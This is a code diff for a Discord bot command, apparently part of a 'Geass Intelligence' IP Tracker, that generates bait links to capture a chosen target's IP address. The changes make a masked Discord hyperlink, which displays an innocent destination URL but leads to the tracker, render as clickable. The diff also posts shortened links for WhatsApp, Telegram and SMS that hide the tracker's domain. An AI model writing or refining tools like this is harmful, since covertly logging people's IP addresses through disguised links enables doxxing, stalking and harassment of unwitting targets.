@@ -3096,24 +3096,42 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
       }
     } catch { /* non-fatal — short URL is optional */ }
 
-    // ── Discord masked hyperlink — shows the real URL text but links to tracker
-    // Works in Discord DMs and messages: [visible text](actual url)
-    const discordMaskedLink = isMasked
-      ? `[${effectiveDest}](${url})`
-      : null;
+    // ── Build message content (markdown links render here, not in embed fields) ──
+    // [visible text](url) hyperlinks ONLY work in message content & embed description,
+    // NOT in embed field values — that's why we split them here.
+    const contentLines: string[] = [];
 
+    if (isMasked) {
+      // Discord masked link: displays as the real URL, clicks go to tracker
+      contentLines.push(`## 🪤 IP TRACKER — URL MASKING`);
+      contentLines.push(``);
+      contentLines.push(`**💬 Enviar no Discord** *(clica como se fosse o link real)*`);
+      contentLines.push(`> [${effectiveDest}](${url})`);
+    } else {
+      contentLines.push(`## 🪤 IP TRACKER — ${themeLabel}`);
+    }
+
+    if (shortUrl) {
+      contentLines.push(``);
+      contentLines.push(`**📱 Enviar no WhatsApp / Telegram / SMS:**`);
+      contentLines.push(`> ${shortUrl}`);
+    }
+
+    if (!isMasked) {
+      contentLines.push(``);
+      contentLines.push(`**🔗 Link bait:**`);
+      contentLines.push(`> ${url}`);
+    }
+
+    const messageContent = contentLines.join("\n");
+
+    // ── Clean embed — only metadata, no links ─────────────────────────────────
     const embed = new EmbedBuilder()
       .setColor(isMasked ? 0x00C851 : COLORS.PURPLE)
-      .setTitle(isMasked ? `🪤 URL MASKING ATIVO — ${themeLabel}` : `🪤 IP TRACKER BAIT — ${themeLabel}`)
-      .setDescription(
-        isMasked
-          ? `*"O link parece inocente, mas o Geass já abriu seu olho."*\n\n⚡ **URL Masking ativo** — o alvo vê o link original, mas o tracker captura o IP antes de redirecionar.`
-          : `*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`
-      )
       .addFields(
         {
-          name: "🎭 Aparência / Tema",
-          value: `${themeLabel} — tela de carregamento convincente`,
+          name: "🎭 Tema visual",
+          value: themeLabel,
           inline: true,
         },
         {
@@ -3122,66 +3140,34 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
           inline: true,
         },
         {
-          name: "\u200b",
-          value: "\u200b",
-          inline: true,
-        },
-      );
-
-    // ── Link fields — most important section ──────────────────────────────────
-    if (isMasked && discordMaskedLink) {
-      embed.addFields(
-        {
-          name: "✅ Para Discord DM / servidor — copie e cole:",
-          value: `> ${discordMaskedLink}\n\n📌 No Discord aparece como \`${effectiveDest.slice(0, 60)}\` mas vai pro tracker`,
+          name: "🔀 Destino",
+          value: `\`${effectiveDest.length > 50 ? effectiveDest.slice(0, 47) + "..." : effectiveDest}\``,
           inline: false,
         },
-      );
-    }
-
-    if (shortUrl) {
-      embed.addFields({
-        name: "📱 Link curto — WhatsApp / Telegram / SMS:",
-        value: `> \`${shortUrl}\`\n\n📌 Funciona em qualquer app — não mostra o domínio do tracker`,
-        inline: false,
-      });
-    }
-
-    embed.addFields(
-      {
-        name: "🔗 Link tracker completo (referência):",
-        value: `> \`${url}\``,
-        inline: false,
-      },
-      {
-        name: isMasked ? "🎯 Destino real (oculto do alvo)" : "🔀 Redireciona para",
-        value: `\`${effectiveDest.length > 80 ? effectiveDest.slice(0, 77) + "..." : effectiveDest}\``,
-        inline: false,
-      },
-      {
-        name: "🔑 Token",
-        value: `\`${token}\``,
-        inline: true,
-      },
-      {
-        name: "⏱️ Gerado",
-        value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
-        inline: true,
-      },
-      {
-        name: "📊 Verificar captura",
-        value: `\`/panel ipcheck token:${token}\``,
-        inline: false,
-      },
-    );
+        {
+          name: "🔑 Token",
+          value: `\`${token}\``,
+          inline: true,
+        },
+        {
+          name: "⏱️ Gerado",
+          value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
+          inline: true,
+        },
+        {
+          name: "📊 Ver resultado",
+          value: `\`/panel ipcheck token:${token}\``,
+          inline: false,
+        },
+      )
+      .setTimestamp()
+      .setFooter({ text: `${AUTHOR} • Geass Intelligence — IP Tracker v2` });
 
     if (targetUser?.displayAvatarURL) {
       embed.setThumbnail(targetUser.displayAvatarURL({ size: 256 }));
     }
 
-    embed.setTimestamp().setFooter({ text: `${AUTHOR} • Geass Intelligence Division — IP Tracker v2` });
-
-    await interaction.editReply({ embeds: [embed] });
+    await interaction.editReply({ content: messageContent, embeds: [embed] });
 
     console.log(`[IP TRACKER] 🪤 Bait gerado por ${callerName} (${callerId}) — tema: ${theme} — alvo: ${targetName} — token: ${token.slice(0, 8)}...`);
 
